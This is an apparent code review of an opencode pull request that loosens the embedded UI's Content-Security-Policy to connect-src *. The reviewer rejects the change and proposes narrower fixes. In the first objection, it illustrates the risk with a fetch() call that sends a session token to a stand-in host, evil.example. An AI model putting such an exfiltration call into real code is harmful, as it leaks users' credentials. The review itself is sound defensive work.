# sst/opencode #25838 — fix(server): allow all connect-src origins in CSP for embedded UI

- Head SHA: `068c093d0c0181dc1ee0a49ce9ce0cda8560d525`
- Diff: +2 / −2 in `packages/opencode/src/server/shared/ui.ts`

## Verdict: `request-changes`

## What it does

Replaces `connect-src 'self' data:` with `connect-src *` in both the `DEFAULT_CSP` constant and the dynamic `csp(hash)` builder for the embedded web UI served by `packages/opencode/src/server/shared/ui.ts:13` and `:18`. The intent (per the PR title) is to let the embedded UI talk to arbitrary origins from the browser — typically because users want to point the UI at remote API endpoints, custom proxies, or third-party model providers without re-rolling the CSP per deployment.

## Why this is the wrong fix

1. **`connect-src *` is a meaningful regression in the local-server threat model.** The whole point of `connect-src 'self' data:` was to keep an XSS-or-supply-chain compromise of the embedded UI from being able to exfiltrate session data, prompts, tool I/O, or the local server's API token to an attacker-controlled origin. Flipping to `*` means a single tainted dependency in the UI bundle (or any reflected-content sink) can `fetch('https://evil.example/?…' + sessionToken)` and the browser will happily allow it. The other directives (`script-src 'self' 'wasm-unsafe-eval'` + the optional preload-script hash, `style-src 'self' 'unsafe-inline'`) are still relatively tight, so this would become *the* weakest directive in the bundle.
2. **The PR has no body, no motivating use case, no allowlist alternative discussed.** The diff is two character swaps with zero accompanying rationale — that's exactly the change shape that lands by inertia and gets noticed only after a CVE. At minimum the PR needs to articulate (a) which user flow is actually blocked by `connect-src 'self' data:` today, and (b) why a narrower fix (e.g., environment-driven allowlist, per-deployment CSP override, dropping to `connect-src 'self' data: https:` to mirror `img-src`) doesn't cover it.
3. **There's already precedent for narrower CSP loosening in this same file.** `img-src` is `'self' data: https:` — *not* `*` — even though images are far less dangerous than arbitrary connect targets. The existing pattern says "loosen by scheme, not by wildcard." This PR breaks that pattern without explaining why.

## What I'd accept instead

- **Allowlist driven by config**: read additional `connect-src` origins from `Flag` / config and append them to the CSP at build time, defaulting to `'self' data:`. Same UX for users who really do need to reach a remote API; no new exfil surface for everyone else.
- **Scheme-only loosening**: `connect-src 'self' data: https:` mirrors what `img-src` already does. Still defeats most exfil patterns (no `http:`, no `ws:`, no `wss://attacker:9999/…` over loopback) while unblocking the common "connect to a hosted API" case.
- **Documented per-deployment override**: add a `OPENCODE_CSP_CONNECT_SRC` env var (or similar) that the operator sets explicitly, with the default kept tight. Makes the loosening an opt-in audit-trail decision.

## Citations

- `packages/opencode/src/server/shared/ui.ts:13` — `DEFAULT_CSP` line, `connect-src 'self' data:` → `connect-src *`
- `packages/opencode/src/server/shared/ui.ts:18` — dynamic `csp(hash)` builder, same swap
- `packages/opencode/src/server/shared/ui.ts:15` (existing) — `img-src 'self' data: https:` is the pattern this PR should follow
